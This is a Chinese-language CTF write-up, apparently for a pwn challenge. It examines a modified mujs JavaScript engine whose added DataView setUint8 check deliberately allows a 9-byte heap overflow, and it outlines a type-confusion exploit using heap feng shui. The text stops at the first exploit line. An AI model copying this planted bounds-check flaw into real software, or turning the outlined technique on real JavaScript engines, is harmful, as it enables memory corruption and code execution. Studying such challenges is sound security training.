			<span class="token keyword">int</span> length<span class="token punctuation">;</span>
		<span class="token punctuation">}</span> a<span class="token punctuation">;</span>
		<span class="token keyword">struct</span> <span class="token punctuation">{</span>
			js_Function <span class="token operator">*</span>function<span class="token punctuation">;</span>
			js_Environment <span class="token operator">*</span>scope<span class="token punctuation">;</span>
		<span class="token punctuation">}</span> f<span class="token punctuation">;</span>
		<span class="token keyword">struct</span> <span class="token punctuation">{</span>
			<span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span>
			js_CFunction function<span class="token punctuation">;</span>
			js_CFunction constructor<span class="token punctuation">;</span>
			<span class="token keyword">int</span> length<span class="token punctuation">;</span>
			<span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>
			js_Finalize finalize<span class="token punctuation">;</span>
		<span class="token punctuation">}</span> c<span class="token punctuation">;</span>
		js_Regexp r<span class="token punctuation">;</span>
		<span class="token keyword">struct</span> <span class="token punctuation">{</span>
			js_Object <span class="token operator">*</span>target<span class="token punctuation">;</span>
			js_Iterator <span class="token operator">*</span>head<span class="token punctuation">;</span>
		<span class="token punctuation">}</span> iter<span class="token punctuation">;</span>
		<span class="token keyword">struct</span> <span class="token punctuation">{</span>
			<span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>tag<span class="token punctuation">;</span>
			<span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>
			js_HasProperty has<span class="token punctuation">;</span>
			js_Put put<span class="token punctuation">;</span>
			js_Delete delete<span class="token punctuation">;</span>
			js_Finalize finalize<span class="token punctuation">;</span>
		<span class="token punctuation">}</span> user<span class="token punctuation">;</span>
		<span class="token keyword">struct</span> <span class="token punctuation">{</span>
		    <span class="token class-name">uint32_t</span> length<span class="token punctuation">;</span>
		    <span class="token class-name">uint8_t</span><span class="token operator">*</span> data<span class="token punctuation">;</span>
		<span class="token punctuation">}</span> dataview<span class="token punctuation">;</span>
	<span class="token punctuation">}</span> u<span class="token punctuation">;</span>
	js_Object <span class="token operator">*</span>gcnext<span class="token punctuation">;</span> <span class="token comment">/* allocation list */</span>
	js_Object <span class="token operator">*</span>gcroot<span class="token punctuation">;</span> <span class="token comment">/* scan list */</span>
	<span class="token keyword">int</span> gcmark<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br></div></div><p>题目添加的是最后一个 <code>object.u.dataview</code>结构，</p> <p>当在js中定义新的结构时， 会自动转向对应的创建函数，在<code>jsbuiltin.c</code>函数中，<code>jsB_init</code>函数在程序载入文件之前进行各种类型的初始化，设置原型和调用各个类型的初始化函数，注册对应类型的相关函数。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">void</span> <span class="token function">jsB_init</span><span class="token punctuation">(</span>js_State <span class="token operator">*</span>J<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token comment">/* Create the prototype objects here, before the constructors */</span>
	J<span class="token operator">-&gt;</span>Object_prototype <span class="token operator">=</span> <span class="token function">jsV_newobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> JS_COBJECT<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	J<span class="token operator">-&gt;</span>Array_prototype <span class="token operator">=</span> <span class="token function">jsV_newobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> JS_CARRAY<span class="token punctuation">,</span> J<span class="token operator">-&gt;</span>Object_prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
	J<span class="token operator">-&gt;</span>Function_prototype <span class="token operator">=</span> <span class="token function">jsV_newobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> JS_CCFUNCTION<span class="token punctuation">,</span> J<span class="token operator">-&gt;</span>Object_prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
	J<span class="token operator">-&gt;</span>Boolean_prototype <span class="token operator">=</span> <span class="token function">jsV_newobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> JS_CBOOLEAN<span class="token punctuation">,</span> J<span class="token operator">-&gt;</span>Object_prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
	J<span class="token operator">-&gt;</span>Number_prototype <span class="token operator">=</span> <span class="token function">jsV_newobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> JS_CNUMBER<span class="token punctuation">,</span> J<span class="token operator">-&gt;</span>Object_prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
	J<span class="token operator">-&gt;</span>String_prototype <span class="token operator">=</span> <span class="token function">jsV_newobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> JS_CSTRING<span class="token punctuation">,</span> J<span class="token operator">-&gt;</span>Object_prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
	J<span class="token operator">-&gt;</span>Date_prototype <span class="token operator">=</span> <span class="token function">jsV_newobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> JS_CDATE<span class="token punctuation">,</span> J<span class="token operator">-&gt;</span>Object_prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>

	J<span class="token operator">-&gt;</span>RegExp_prototype <span class="token operator">=</span> <span class="token function">jsV_newobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> JS_CREGEXP<span class="token punctuation">,</span> J<span class="token operator">-&gt;</span>Object_prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
	J<span class="token operator">-&gt;</span>RegExp_prototype<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>r<span class="token punctuation">.</span>prog <span class="token operator">=</span> <span class="token function">js_regcompx</span><span class="token punctuation">(</span>J<span class="token operator">-&gt;</span>alloc<span class="token punctuation">,</span> J<span class="token operator">-&gt;</span>actx<span class="token punctuation">,</span> <span class="token string">&quot;(?:)&quot;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	J<span class="token operator">-&gt;</span>RegExp_prototype<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>r<span class="token punctuation">.</span>source <span class="token operator">=</span> <span class="token function">js_strdup</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;(?:)&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	J<span class="token operator">-&gt;</span>DataView_prototype <span class="token operator">=</span> <span class="token function">jsV_newobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> JS_CDATAVIEW<span class="token punctuation">,</span> J<span class="token operator">-&gt;</span>Object_prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* All the native error types */</span>
	J<span class="token operator">-&gt;</span>Error_prototype <span class="token operator">=</span> <span class="token function">jsV_newobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> JS_CERROR<span class="token punctuation">,</span> J<span class="token operator">-&gt;</span>Object_prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
	J<span class="token operator">-&gt;</span>EvalError_prototype <span class="token operator">=</span> <span class="token function">jsV_newobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> JS_CERROR<span class="token punctuation">,</span> J<span class="token operator">-&gt;</span>Error_prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
	J<span class="token operator">-&gt;</span>RangeError_prototype <span class="token operator">=</span> <span class="token function">jsV_newobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> JS_CERROR<span class="token punctuation">,</span> J<span class="token operator">-&gt;</span>Error_prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
	J<span class="token operator">-&gt;</span>ReferenceError_prototype <span class="token operator">=</span> <span class="token function">jsV_newobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> JS_CERROR<span class="token punctuation">,</span> J<span class="token operator">-&gt;</span>Error_prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
	J<span class="token operator">-&gt;</span>SyntaxError_prototype <span class="token operator">=</span> <span class="token function">jsV_newobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> JS_CERROR<span class="token punctuation">,</span> J<span class="token operator">-&gt;</span>Error_prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
	J<span class="token operator">-&gt;</span>TypeError_prototype <span class="token operator">=</span> <span class="token function">jsV_newobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> JS_CERROR<span class="token punctuation">,</span> J<span class="token operator">-&gt;</span>Error_prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
	J<span class="token operator">-&gt;</span>URIError_prototype <span class="token operator">=</span> <span class="token function">jsV_newobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> JS_CERROR<span class="token punctuation">,</span> J<span class="token operator">-&gt;</span>Error_prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* Create the constructors and fill out the prototype objects */</span>
	<span class="token function">jsB_initobject</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">jsB_initarray</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">jsB_initfunction</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">jsB_initboolean</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">jsB_initnumber</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">jsB_initstring</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">jsB_initregexp</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">jsB_initdate</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">jsB_initerror</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">jsB_initmath</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">jsB_initjson</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">jsB_initdataview</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* Initialize the global object */</span>
	<span class="token function">js_pushnumber</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> NAN<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">js_defglobal</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;NaN&quot;</span><span class="token punctuation">,</span> JS_READONLY <span class="token operator">|</span> JS_DONTENUM <span class="token operator">|</span> JS_DONTCONF<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">js_pushnumber</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> INFINITY<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">js_defglobal</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;Infinity&quot;</span><span class="token punctuation">,</span> JS_READONLY <span class="token operator">|</span> JS_DONTENUM <span class="token operator">|</span> JS_DONTCONF<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">js_pushundefined</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">js_defglobal</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;undefined&quot;</span><span class="token punctuation">,</span> JS_READONLY <span class="token operator">|</span> JS_DONTENUM <span class="token operator">|</span> JS_DONTCONF<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">jsB_globalf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;parseInt&quot;</span><span class="token punctuation">,</span> jsB_parseInt<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">jsB_globalf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;parseFloat&quot;</span><span class="token punctuation">,</span> jsB_parseFloat<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">jsB_globalf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;isNaN&quot;</span><span class="token punctuation">,</span> jsB_isNaN<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">jsB_globalf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;isFinite&quot;</span><span class="token punctuation">,</span> jsB_isFinite<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">jsB_globalf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;decodeURI&quot;</span><span class="token punctuation">,</span> jsB_decodeURI<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">jsB_globalf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;decodeURIComponent&quot;</span><span class="token punctuation">,</span> jsB_decodeURIComponent<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">jsB_globalf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;encodeURI&quot;</span><span class="token punctuation">,</span> jsB_encodeURI<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">jsB_globalf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;encodeURIComponent&quot;</span><span class="token punctuation">,</span> jsB_encodeURIComponent<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br></div></div><p>题目增加的是<code>jsB_initdataview</code>函数，设置了对应类型在js层的名字和原型方法 创建函数，</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">void</span> <span class="token function">jsB_initdataview</span><span class="token punctuation">(</span>js_State <span class="token operator">*</span>J<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token function">js_pushobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> J<span class="token operator">-&gt;</span>DataView_prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">{</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;DataView.prototype.getUint8&quot;</span><span class="token punctuation">,</span> Dv_getUint8<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;DataView.prototype.setUint8&quot;</span><span class="token punctuation">,</span> Dv_setUint8<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;DataView.prototype.getUint16&quot;</span><span class="token punctuation">,</span> Dv_getUint16<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;DataView.prototype.setUint16&quot;</span><span class="token punctuation">,</span> Dv_setUint16<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;DataView.prototype.getUint32&quot;</span><span class="token punctuation">,</span> Dv_getUint32<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;DataView.prototype.setUint32&quot;</span><span class="token punctuation">,</span> Dv_setUint32<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;DataView.prototype.getLength&quot;</span><span class="token punctuation">,</span> Dv_getLength<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token function">js_newcconstructor</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> jsB_new_DataView<span class="token punctuation">,</span> jsB_new_DataView<span class="token punctuation">,</span> <span class="token string">&quot;DataView&quot;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">js_defglobal</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;DataView&quot;</span><span class="token punctuation">,</span> JS_DONTENUM<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>分析创建函数</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">jsB_new_DataView</span><span class="token punctuation">(</span>js_State <span class="token operator">*</span>J<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">int</span> top <span class="token operator">=</span> <span class="token function">js_gettop</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">size_t</span> size<span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>top <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">js_typeerror</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;new DataView expects a size&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	size <span class="token operator">=</span> <span class="token function">js_tonumber</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	js_Object <span class="token operator">*</span>obj <span class="token operator">=</span> <span class="token function">jsV_newobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> JS_CDATAVIEW<span class="token punctuation">,</span> J<span class="token operator">-&gt;</span>DataView_prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
	obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>dataview<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token function">js_malloc</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memset</span><span class="token punctuation">(</span>obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>dataview<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>dataview<span class="token punctuation">.</span>length <span class="token operator">=</span> size<span class="token punctuation">;</span>
	<span class="token function">js_pushobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>其实就是申请一个堆块，然后相关方法都是get set这个内存块。</p> <h3 id="漏洞"><a href="#漏洞" class="header-anchor">#</a> 漏洞</h3> <p>这个位置， 存在一个溢出， 可以向后溢出0x9字节。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Dv_setUint8</span><span class="token punctuation">(</span>js_State <span class="token operator">*</span>J<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	js_Object <span class="token operator">*</span>self <span class="token operator">=</span> <span class="token function">js_toobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token operator">-&gt;</span>type <span class="token operator">!=</span> JS_CDATAVIEW<span class="token punctuation">)</span> <span class="token function">js_typeerror</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;not an DataView&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">size_t</span> index <span class="token operator">=</span> <span class="token function">js_tonumber</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span> value <span class="token operator">=</span> <span class="token function">js_tonumber</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">&lt;</span> self<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>dataview<span class="token punctuation">.</span>length<span class="token operator">+</span><span class="token number">0x9</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		self<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>dataview<span class="token punctuation">.</span>data<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
		<span class="token function">js_error</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;out of bounds access on DataView&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>这里是向前溢出0x3字节，但是只能改本chunk的size位， 比较难利用。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Dv_setUint32</span><span class="token punctuation">(</span>js_State <span class="token operator">*</span>J<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	js_Object <span class="token operator">*</span>self <span class="token operator">=</span> <span class="token function">js_toobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token operator">-&gt;</span>type <span class="token operator">!=</span> JS_CDATAVIEW<span class="token punctuation">)</span> <span class="token function">js_typeerror</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;not an DataView&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">size_t</span> index <span class="token operator">=</span> <span class="token function">js_tonumber</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">uint32_t</span> value <span class="token operator">=</span> <span class="token function">js_tonumber</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>index<span class="token operator">+</span><span class="token number">3</span> <span class="token operator">&lt;</span> self<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>dataview<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>self<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>dataview<span class="token punctuation">.</span>data<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
		<span class="token function">js_error</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;out of bounds access on DataView&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h2 id="利用"><a href="#利用" class="header-anchor">#</a> 利用</h2> <p>目前是向后溢出0x9字节，这个距离正好可以越过size位， 修改下个堆快的第一个字符，</p> <p>这里很容易想到<code>js_Object</code>， 因为这个位置正好是<code>type</code>， 而通过<code>union</code>可以实现类型混淆，</p> <h3 id="堆风水"><a href="#堆风水" class="header-anchor">#</a> 堆风水</h3> <p>于是这里的思路是调试一下堆风水，利用这个类型混淆进行修改下个object, 那么堆应该是<code>a.u.dataview.data</code>挨着<code>b</code>，</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>a <span class="token operator">=</span> <span class="token function">DataView</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
